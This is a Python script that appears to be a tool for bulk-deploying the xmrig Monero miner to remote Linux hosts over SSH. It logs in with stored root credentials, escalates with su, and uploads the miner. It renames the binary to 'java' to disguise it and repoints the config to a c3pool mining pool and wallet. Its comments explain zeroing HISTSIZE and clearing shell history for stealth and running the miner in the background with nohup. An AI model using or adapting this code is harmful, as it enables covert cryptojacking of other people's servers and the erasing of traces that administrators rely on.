__author__ = 'leezp'
# -*- coding:utf-8 -*-
#  快速部署矿机 v5.5.1
# "donate-level": 1,
# "url": "mine.c3pool.com:13333",
# "user": "wallet address"
# "pass": "x"

'''
grep "HISTSIZE=" /etc/profile
HISTSIZE=5000

批量替换  https://www.jb51.net/article/141234.htm
s 命令:
sed 's/HISTSIZE=5000/HISTSIZE=0/g' /etc/profile -i 
source /etc/profile  # 使设置生效

之后再恢复  (使适用于一对一提高隐蔽性)
sed 's/HISTSIZE=0/HISTSIZE=5000/g' /etc/profile -i 
source /etc/profile  
'''

# 关于cmd 历史记录
# 查看 历史记录默认记录数 echo  $HISTSIZE
# 修改/etc/profile，中HISTSIZE的大小，可以修改被记录的历史记录数。 source  /etc/profile 使设定生效
# history -c  清空cmd历史记录


'''
后台自动运行：
[root@test]# nohup ./process 2>&1 &
[1] 27905
[root@test]# nohup: ignoring input and appending output to ‘nohup.out’

然后 ctrl+c 
查看 top
存在 java 进程，但关掉xshell后进程 消失原因：
当shell中提示了nohup成功后还需要按终端上键盘任意键退回到 shell输入命令窗口，然后通过在shell中输入exit来退出终端；
如果每次在nohup执行成功后直接点关闭xshell程序按钮关闭终端，
这样会断掉该命令所对应的session，导致nohup对应的进程被通知需要一起shutdown。
'''

import time
import paramiko


def creatSShConnectOb(ip_remote, port_remote, username, password):
    print('---------- start to create SSH object')
    print(
        'Remote SSH Info: \'ip:%s  port:%d  username:%s  password:%s\'' % (ip_remote, port_remote, username, password))
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip_remote, port_remote, username=username, password=password, timeout=60)  # timeout protection
        return ssh
    except:
        print('Warning:\nFist connect the ABC failed, now will retry!')
        ssh.connect(ip_remote, port_remote, username=username, password=password, timeout=60)  # timeout re-try
        print('Error:\nAttempt to connect ABC failed!!! Please check the IP / port/ account / password.')


def chanel_exe_cmd(ChanelSSHOb, cmd, t=0.1):
    ChanelSSHOb.send(cmd)
    ChanelSSHOb.send("\n")
    time.sleep(t)
    resp = ChanelSSHOb.recv(9999).decode("utf8")
    # print("Exec Result: %s" % (resp) + '\n')
    return resp


def upload2(ip, port, username, password):
    transport = paramiko.Transport((ip, port))
    transport.connect(username=username, password=password)
    sftp = paramiko.SFTPClient.from_transport(transport)  # 如果连接需要密钥，则要加上一个参数，hostkey="密钥"
    sftp.put('C:\\Users\\Administrator\\Desktop\\xmrig-5.5.1-xenial-x64.tar.gz',
             '/tmp/test.tar.gz')
    transport.close()  # 关闭连接


def upload(ip, port, username, password):
    transport = paramiko.Transport((ip, port))
    transport.connect(username=username, password=password)
    sftp = paramiko.SFTPClient.from_transport(transport)  # 如果连接需要密钥，则要加上一个参数，hostkey="密钥"
    sftp.put('C:\\Users\\Administrator\\Desktop\\xmrig-5.5.1-xenial-x64.tar.gz',
             '/home/test/test.tar.gz')
    transport.close()  # 关闭连接


'''
{
"donate-level": '111'
"donate-over-proxy":22,
    "pools": [
         {
            "algo": null,
            "coin": null,
             "url": "mine.c3pool.com:13333",
             "user": "wallet address",
             "pass": "x26",
            }]
}

line=$(awk -F"\"": '/donate-level/{print NR}' config.json)
old=$(awk -F"\"": '/donate-level/{print $2}' config.json) # $2  表示打印 json 节点 "donate-level" 的值
sed -e "$line s@$old@ '1'@" -i config.json # 替换所在行的老数据为 1,   -i config.json 表示将结果写入 json文件，不加-i 表示 不写入文件。只在shell 打印
'''


def modifyjson(chanelSSHOb, ip):
    path = '/home/test/'
    x_num = 'x' + str(ip.split('.')[-1].strip())
    print(x_num)
    # /donate-level/  表示 json 节点 "donate-level" 的值
    # 反斜杠要转义
    sshCmd = '''line=$(awk -F"\\"": '/donate-level/{print NR}' /home/test/config.json)  && old=$(awk -F"\\"": '/donate-level/{print $2}' /home/test/config.json) && sed -e "$line s@$old@ 1,@" -i /home/test/config.json'''
    chanel_exe_cmd(chanelSSHOb, sshCmd)

    sshCmd = '''line=$(awk -F"\\"": '/url/{print NR}' %sconfig.json);
    old=$(awk -F"\\"": '/url/{print $2}' %sconfig.json);
    sed -e "$line s@$old@ \\"mine.c3pool.com:13333\\",@" -i %sconfig.json;''' % (path, path, path)
    chanel_exe_cmd(chanelSSHOb, sshCmd)  # 默认可执行多行，要加分号，注意转义
    '''
    若报错可以用   ssh.exec_command  将结果打印调试可快速定位问题
    stdin, stdout, stderr =ssh.exec_command(sshCmd ,get_pty=True)
    result = stdout.read()
    print(result.decode().strip())     
    '''

    sshCmd = '''line=$(awk -F"\\"": '/user":/{print NR}' %sconfig.json) && old=$(awk -F"\\"": '/user":/{print $2}' %sconfig.json) && sed -e "$line s@$old@ \\"wallet address\\",@" -i %sconfig.json''' % (
        path, path, path)
    chanel_exe_cmd(chanelSSHOb, sshCmd)


def remove(chanelSSHOb):
    sshCmd = 'rm -f /home/test/java'
    chanel_exe_cmd(chanelSSHOb, sshCmd)
    sshCmd = 'rm -f /home/test/xmrig-notls'
    chanel_exe_cmd(chanelSSHOb, sshCmd)
    sshCmd = 'rm -f /home/test/config.json'
    chanel_exe_cmd(chanelSSHOb, sshCmd)
    sshCmd = 'rm -f /home/test/nohup'
    chanel_exe_cmd(chanelSSHOb, sshCmd)


# 需要先 useradd XXX, 若无权限，需要 mkdir
if __name__ == '__main__':
    host = {
        # 2: '172.16.1.2,root,XXX'          
        1: '172.16.1.3,root,XXX'        
    }
    for k in range(len(host)):
        ip = host.get(k + 1).split(':')[0].strip()
        port = host.get(k + 1).split(',')[0].split(':')[-1].strip()
        username = host.get(k + 1).split(',')[1].strip()
        password = host.get(k + 1).split(',')[2].strip()
        listen_port = host.get(k + 1).split(',')[-1].strip()
        html = ip.split('.')[-1].strip()
        ssh = creatSShConnectOb(ip, int(port), username=username, password=password)

        chanelSSHOb = ssh.invoke_shell()  # 建立交互式的shell
        # 检查当前用户是否是 root
        Flag = True
        stdin, stdout, stderr = ssh.exec_command("whoami")
        result = stdout.read()
        if result and result.decode().strip() == 'root':
            pass
        else:
            Flag = False
            sshCmd = 'su'
            stdin, stdout, stderr = ssh.exec_command(sshCmd)
            if chanel_exe_cmd(chanelSSHOb, sshCmd).endswith(u"Password: "):
                sshCmd = 'sh_pwd'
                chanel_exe_cmd(chanelSSHOb, sshCmd)

        if Flag:
            # root 用户上传
            upload(ip, int(port), username, password)
            pass
        else:
            # 非 root 用户上传到 /tmp
            upload2(ip, int(port), username, password)
            sshCmd = 'mv /tmp/test.tar.gz /home'
            chanel_exe_cmd(chanelSSHOb, sshCmd)

        sshCmd = 'tar -zxvf /home/test.tar.gz -C /home'  # 此处需要加 -C 绝对路径才能成功
        chanel_exe_cmd(chanelSSHOb, sshCmd)
        sshCmd = 'mv  /home/xmrig-5.5.1 /home/test'
        chanel_exe_cmd(chanelSSHOb, sshCmd)
        sshCmd = 'mv  /home/test/xmrig /home/test/java'
        chanel_exe_cmd(chanelSSHOb, sshCmd)
        sshCmd = 'rm -f /home/test.tar.gz'
        chanel_exe_cmd(chanelSSHOb, sshCmd)
        sshCmd = 'rm  -f /home/test/SHA256SUMS'
        chanel_exe_cmd(chanelSSHOb, sshCmd)
        # remove(chanelSSHOb, ip)
        modifyjson(chanelSSHOb, ip)
